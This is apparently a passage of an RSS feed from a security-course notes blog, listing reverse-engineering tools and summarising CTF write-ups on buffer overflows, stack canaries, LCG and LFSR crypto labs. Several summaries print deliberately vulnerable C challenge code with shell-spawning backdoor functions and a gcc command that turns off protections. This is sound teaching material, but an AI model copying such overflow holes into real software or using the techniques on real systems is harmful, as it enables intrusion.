&lt;/ol>
&lt;/li>
&lt;li>如果函式沒有return東西的話，可以右鍵該函示，選擇&lt;code>Remove return value&lt;/code>或是Shift+Del
:::spoiler
&lt;img src="https://hackmd.io/_uploads/HkRk3JpG6.png" alt="" />
:::&lt;/li>
&lt;li>如果function中的宣告很多，可以右鍵選擇&lt;code>Collapse declarations&lt;/code>
:::spoiler
&lt;img src="https://hackmd.io/_uploads/SkOXU4AMa.png" alt="" />
:::&lt;/li>
&lt;/ul>
&lt;h2 id="x64dbg-常用快捷鍵">
 x64dbg 常用快捷鍵
 &lt;a class="anchor" href="#x64dbg-%e5%b8%b8%e7%94%a8%e5%bf%ab%e6%8d%b7%e9%8d%b5">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>F2: 設定中斷點&lt;/li>
&lt;li>F9: 繼續執行&lt;/li>
&lt;li>F8: 步過&lt;/li>
&lt;li>F7: 步入&lt;/li>
&lt;li>Ctrl+F9: 執行到 ret&lt;/li>
&lt;li>==Ctrl+G==: goto&lt;/li>
&lt;li>==Space==: 修改組譯&lt;/li>
&lt;/ul>
&lt;h3 id="靜態分析">
 靜態分析
 &lt;a class="anchor" href="#%e9%9d%9c%e6%85%8b%e5%88%86%e6%9e%90">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>PEview&lt;/li>
&lt;li>PEViewer&lt;/li>
&lt;li>PE-bear&lt;/li>
&lt;/ul>
&lt;h3 id="動態分析">
 動態分析
 &lt;a class="anchor" href="#%e5%8b%95%e6%85%8b%e5%88%86%e6%9e%90">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>OllyDbg&lt;/li>
&lt;li>x64dbg&lt;/li>
&lt;li>IDA&lt;/li>
&lt;li>Ghidra&lt;/li>
&lt;li>Windbg&lt;/li>
&lt;li>PEtool&lt;/li>
&lt;/ul>
&lt;h3 id="process相關的操作與資訊">
 Process相關的操作與資訊
 &lt;a class="anchor" href="#process%e7%9b%b8%e9%97%9c%e7%9a%84%e6%93%8d%e4%bd%9c%e8%88%87%e8%b3%87%e8%a8%8a">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Procexp &amp;amp; Process Hacker
好看版的工作管理員&lt;/li>
&lt;li>Procmon
監控程序行為
Registry
File system
Network
Process/Thread&lt;/li>
&lt;/ul>
&lt;h3 id="好用的解題工具">
 好用的解題工具
 &lt;a class="anchor" href="#%e5%a5%bd%e7%94%a8%e7%9a%84%e8%a7%a3%e9%a1%8c%e5%b7%a5%e5%85%b7">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://docs.angr.io/en/latest/appendix/cheatsheet.html">angr - cheatsheet&lt;/a>: &lt;code>$ pip install angr claripy&lt;/code>&lt;/li>
&lt;li>z3: &lt;code>$ pip install z3-solver&lt;/code>&lt;/li>
&lt;/ul></description></item><item><title>Simple Buffer Overflow - 0x00</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x00/</guid><description>&lt;h1 id="simple-buffer-overflow---0x00">
 Simple Buffer Overflow - 0x00
 &lt;a class="anchor" href="#simple-buffer-overflow---0x00">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
 char buf[0x10];
 read(0, buf, 0x30); // It&amp;#39;ll read the value that you input and store in buf with length=0x30
 system(&amp;#34;pause&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that you can check &lt;a href="https://www.dotcpp.com/course/460">this page&lt;/a> to know more about &lt;code>read&lt;/code> function&lt;/li>
&lt;/ul>
&lt;h2 id="dynamic-analysis---x32dbg">
 Dynamic Analysis - &lt;code>x32dbg&lt;/code>
 &lt;a class="anchor" href="#dynamic-analysis---x32dbg">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>This is the original entry point of this program.
&lt;img src="https://imgur.com/DWOL9Hy.png" alt="" />&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x01</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x01/</guid><description>&lt;h1 id="simple-buffer-overflow---0x01">
 Simple Buffer Overflow - 0x01
 &lt;a class="anchor" href="#simple-buffer-overflow---0x01">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;p>Follow the concept of lecture &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/SJAt7Pd5s">0x00&lt;/a>&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

void y0u_c4n7_533_m3()
{
 execve(&amp;#34;/bin/sh&amp;#34;, (char *[]){0}, (char *[]){0});
}

int main()
{
 char buf[16];
 puts(&amp;#34;This is your first bof challenge ;)&amp;#34;);
 fflush(stdout);
 read(0, buf, 0x30);
 system(&amp;#34;pause&amp;#34;);
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>The secret function is aim to create a shell, therefore, our main purpose is try to get the shell by using buffer overflow.
We can check &lt;code>bof&lt;/code> in the main function that it read the string with length &lt;code>0x30&lt;/code> that bigger than &lt;code>buf&lt;/code> size.&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x02</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x02/</guid><description>&lt;h1 id="simple-buffer-overflow---0x02">
 Simple Buffer Overflow - 0x02
 &lt;a class="anchor" href="#simple-buffer-overflow---0x02">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="why-wed-like-to-create-shellcode">
 Why we&amp;rsquo;d like to create shellcode?
 &lt;a class="anchor" href="#why-wed-like-to-create-shellcode">#&lt;/a>
&lt;/h2>
&lt;p>In pwn problem, most of the program don&amp;rsquo;t have the secret function that we can take the shell. Thus, we can create a shellcode by ourselves and use &lt;code>bof&lt;/code> to overlap the original address by shellcode address. Then we can take the shell.&lt;/p>
&lt;h2 id="how-to-create-a-shellcode-in-bof">
 How to create a shellcode in BOF?
 &lt;a class="anchor" href="#how-to-create-a-shellcode-in-bof">#&lt;/a>
&lt;/h2>
&lt;p>In lecture &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs">0x01&lt;/a>, we can see sub-function that create a shell using command:&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x04</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x04/</guid><description>&lt;h1 id="simple-buffer-overflow---0x04">
 Simple Buffer Overflow - 0x04
 &lt;a class="anchor" href="#simple-buffer-overflow---0x04">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn">#&lt;/a>
&lt;/h6>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

char message[48];

int main()
{
 char name[16];
 printf(&amp;#34;Give me your message: &amp;#34;);
 fflush(stdout);
 read(0, message, 0x30);
 fflush(stdout);
 read(0, name, 0x30);
 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>Actually, this is a variant of the &lt;a href="https://hackmd.io/@UHzVfhAITliOM3mFSo6mfA/HJm5x_Ocs">lecture 0x01&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;font color="F0000">Note that&lt;/font>, the global variable has its own address, instead of local variable that push to stack that we don&amp;rsquo;t know at first.&lt;/p></description></item><item><title>Simple Buffer Overflow - 0x05(Leak Canary)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/simple-buffer-overflow---0x05leak-canary/</guid><description>&lt;h1 id="simple-buffer-overflow---0x05leak-canary">
 Simple Buffer Overflow - 0x05(Leak Canary)
 &lt;a class="anchor" href="#simple-buffer-overflow---0x05leak-canary">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-pwn-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>PWN&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-pwn-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="canary-background">
 Canary Background
 &lt;a class="anchor" href="#canary-background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://imgur.com/onxC8Aq.png" alt="" />&lt;/p>
&lt;h2 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-clike!" data-lang="clike!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

void backdoor()
{
 system(&amp;#34;/bin/sh&amp;#34;);
}

int main()
{
 setvbuf(stdin, 0, _IONBF, 0);
 setvbuf(stdout, 0, _IONBF, 0);

 char name[0x10];
 char phone[0x10];

 printf(&amp;#34;What&amp;#39;s your name: &amp;#34;);
 read(0, name, 0x100);
 printf(&amp;#34;Hello, %s !&amp;#34;, name);

 printf(&amp;#34;What&amp;#39;s your phone number: &amp;#34;);
 read(0, phone, 0x100);

 return 0;
}
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Note that, if you establish the code yourself, you must turn off the protection by the command below and use &lt;code>checksec&lt;/code> to observe the protection
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">gcc -o bof2_leak_canary bof2_leak_canary.c -zexecstack -no-pie -z norelro
&lt;/code>&lt;/pre>&lt;img src="https://imgur.com/u5iueTC.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>First, we can use &lt;code>objdump -d -M Intel {filename}&lt;/code> to check the address of backdoor → &lt;code>0x4011b6&lt;/code>
&lt;img src="https://imgur.com/d30qIvL.png" alt="" />&lt;/p></description></item><item><title>Simple Crypto - 0x01(Modular Operation)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x01modular-operation/</guid><description>&lt;h1 id="simple-crypto---0x01modular-operation">
 Simple Crypto - 0x01(Modular Operation)
 &lt;a class="anchor" href="#simple-crypto---0x01modular-operation">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-crypto-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-crypto-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10225768">『Day 23密碼卷宗現代篇非對稱章 - RSA&lt;/a>
&lt;a href="https://blog.csdn.net/lion19930924/article/details/61926019">模运算与逆元&lt;/a>
模運算基本特性:
$$
(a + b) % p = (a % p + b % p) % p \
(a - b) % p = (a % p - b % p) % p \
(a * b) % p = (a % p * b % p) % p \
(a ^ b) % p = ((a % p) ^ b ) % p
$$
模運算的结合律：
$$
((a + b) % p + c) % p= (a + (b + c) % p) % p \
((a * b) % p * c) % p = (a * (b * c) % p ) % p
$$
交換律：
$$
(a + b) % p = (b+a) % p \
(a * b) % p = (b * a) % p
$$
分配率：
$$
((a +b) % p * c) % p = ((a * c) % p + (b * c) % p) % p
$$&lt;/p></description></item><item><title>Simple Crypto - 0x02(Random Number Generator - LCG)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x02random-number-generator---lcg/</guid><description>&lt;h1 id="simple-crypto---0x02random-number-generator---lcg">
 Simple Crypto - 0x02(Random Number Generator - LCG)
 &lt;a class="anchor" href="#simple-crypto---0x02random-number-generator---lcg">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-crypto-eductf">
 tags: &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code> &lt;code>eductf&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-crypto-eductf">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Linear Congruential Generator:
&lt;img src="https://i.imgur.com/pCTWEcO.png" alt="" />&lt;/p>
&lt;h2 id="analysis">
 Analysis
 &lt;a class="anchor" href="#analysis">#&lt;/a>
&lt;/h2>
&lt;p>LCG Formula
$$
\begin{aligned}
Unknown: S_0&amp;amp;=Seed,\ A,\ B,\ m = 2^{32} \
Given: S_1&amp;amp;,\ S_2,\ S_3\
S_1 &amp;amp;\equiv (AS_0\ +\ B)\ %\ m\
S_2 &amp;amp;\equiv (AS_1\ +\ B)\ %\ m\
S_3 &amp;amp;\equiv (AS_2\ +\ B)\ %\ m\
\end{aligned}
$$&lt;/p>
&lt;p>Derived A
$$
\begin{aligned}
&amp;amp;\left{
\begin{array}{c}
S_2 &amp;amp;\equiv (AS_1\ +\ B)\ %\ m\
S_3 &amp;amp;\equiv (AS_2\ +\ B)\ %\ m
\end{array}
\right.
\ \ \ \ \ \ minus \ two \ formula\ \
&amp;amp;\to (S_2-S_3) \equiv (AS_1\ +\ B)\ %\ m-(AS_2\ +\ B)\ %\ m \
&amp;amp;\to (S_2-S_3)\ % \ m\equiv [(AS_1\ +\ B)\ %\ m-(AS_2\ +\ B)\ %\ m]\ %\ m \
&amp;amp;\to (S_2-S_3)\ % \ m\equiv [(AS_1\ +\ B)-(AS_2\ +\ B)]\ %\ m \
&amp;amp;\to (S_2-S_3)\ % \ m\equiv \ A\ (S_1-S_2)\ \ %\ m =(S_2-S_3)\
A&amp;amp;=((S_2-S_3)(S_1-S_2)^{-1})\ %\ m
\end{aligned}
$$&lt;/p></description></item><item><title>Simple Crypto - 0x03(2023 Lab - COR)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x032023-lab---cor/</guid><description>&lt;h1 id="simple-crypto---0x032023-lab---cor">
 Simple Crypto - 0x03(2023 Lab - COR)
 &lt;a class="anchor" href="#simple-crypto---0x032023-lab---cor">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/rkiE18Kas">Simple Crypto - 0x03(Lab - LFSR)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> random
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">LFSR&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, tap, state):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_tap &lt;span style="color:#f92672">=&lt;/span> tap
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_state &lt;span style="color:#f92672">=&lt;/span> state
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getbit&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f &lt;span style="color:#f92672">=&lt;/span> sum([self&lt;span style="color:#f92672">.&lt;/span>_state[i] &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_tap]) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_state[&lt;span style="color:#ae81ff">0&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_state &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_state[&lt;span style="color:#ae81ff">1&lt;/span>:] &lt;span style="color:#f92672">+&lt;/span> [f]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> x
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">triLFSR&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, lfsr1, lfsr2, lfsr3):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>lfsr1 &lt;span style="color:#f92672">=&lt;/span> lfsr1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>lfsr2 &lt;span style="color:#f92672">=&lt;/span> lfsr2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>lfsr3 &lt;span style="color:#f92672">=&lt;/span> lfsr3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">getbit&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x1 &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>lfsr1&lt;span style="color:#f92672">.&lt;/span>getbit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x2 &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>lfsr2&lt;span style="color:#f92672">.&lt;/span>getbit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> x3 &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>lfsr3&lt;span style="color:#f92672">.&lt;/span>getbit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> x2 &lt;span style="color:#66d9ef">if&lt;/span> x1 &lt;span style="color:#66d9ef">else&lt;/span> x3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lfsr1 &lt;span style="color:#f92672">=&lt;/span> LFSR([&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>], [random&lt;span style="color:#f92672">.&lt;/span>randrange(&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">19&lt;/span>)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lfsr2 &lt;span style="color:#f92672">=&lt;/span> LFSR([&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>], [random&lt;span style="color:#f92672">.&lt;/span>randrange(&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">23&lt;/span>)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lfsr3 &lt;span style="color:#f92672">=&lt;/span> LFSR([&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>], [random&lt;span style="color:#f92672">.&lt;/span>randrange(&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">27&lt;/span>)])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> triLFSR(lfsr1, lfsr2, lfsr3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> map(int, &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join([&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{:08b}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(c) &lt;span style="color:#66d9ef">for&lt;/span> c &lt;span style="color:#f92672">in&lt;/span> FLAG]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>output &lt;span style="color:#f92672">=&lt;/span> []
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">200&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output&lt;span style="color:#f92672">.&lt;/span>append(cipher&lt;span style="color:#f92672">.&lt;/span>getbit())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> b &lt;span style="color:#f92672">in&lt;/span> flag:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output&lt;span style="color:#f92672">.&lt;/span>append(cipher&lt;span style="color:#f92672">.&lt;/span>getbit() &lt;span style="color:#f92672">^&lt;/span> b)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(output)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># [0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 0]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x03(Lab - LFSR)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x03lab---lfsr/</guid><description>&lt;h1 id="simple-crypto---0x03lab---lfsr">
 Simple Crypto - 0x03(Lab - LFSR)
 &lt;a class="anchor" href="#simple-crypto---0x03lab---lfsr">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-eductf-ctf-crypto">
 tags: &lt;code>eductf&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-eductf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/hnXtaiyvQ3s?t=945">[2022 fall] 0923 Crypto - LFSR&lt;/a>
&lt;a href="https://youtu.be/dYyNeMeDM20?t=4386">Crypto I - LFSR&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>Must read the source code first with some comment I added
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-pytho=" data-lang="pytho=">import random

# from secret import FLAG

FLAG = b&amp;#39;00001111&amp;#39;

class LFSR:
 def __init__(self, tap, state):
 self._tap = tap
 self._state = state

 def getbit(self):
